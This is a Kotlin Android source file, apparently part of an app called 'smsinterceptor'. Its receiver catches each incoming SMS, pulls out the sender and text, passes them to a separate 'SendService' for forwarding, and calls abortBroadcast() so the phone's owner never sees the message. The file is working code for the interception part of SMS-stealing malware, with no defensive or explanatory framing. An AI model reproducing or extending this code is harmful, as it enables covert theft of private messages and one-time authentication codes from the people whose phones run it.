package ru.smsinterceptor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage

class Interceptor : BroadcastReceiver() {
    val ACTION = "android.provider.Telephony.SMS_RECEIVED"

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent != null && intent.action != null && ACTION.compareTo(intent.action!!, true) == 0) {
            val pduArray: Array<Any> = intent.extras?.get("pdus") as Array<Any>
            val messages = arrayOfNulls<SmsMessage>(pduArray.size)
            for (i in pduArray.indices) {
                messages[i] = SmsMessage.createFromPdu(pduArray[i] as ByteArray)
            }

            val text = StringBuilder()
            val from = messages[0]?.displayOriginatingAddress
            for (message in messages) {
                text.append(message?.messageBody)
            }
            val body = text.toString()

            val service_intent = Intent(context, SendService::class.java)
            service_intent.putExtra("sms_body", body)
            service_intent.putExtra("sms_from", from)

            context?.startService(service_intent)

            abortBroadcast()
        }
    }
}